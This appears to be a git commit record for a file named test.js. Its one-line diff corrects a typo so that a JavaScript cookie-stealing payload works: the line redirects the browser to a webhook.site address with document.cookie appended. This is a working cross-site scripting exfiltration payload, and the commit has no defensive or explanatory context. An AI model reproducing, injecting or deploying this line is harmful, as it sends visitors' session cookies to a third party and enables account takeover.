fcee4e37aaeaed91acd9f93d675ec07de81d9404
wldldlq <smjy01@gmail.com>
2024-09-26 15:33:14 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-location.href="	https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q="+document.cookies;
+location.href="	https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q="+document.cookie;
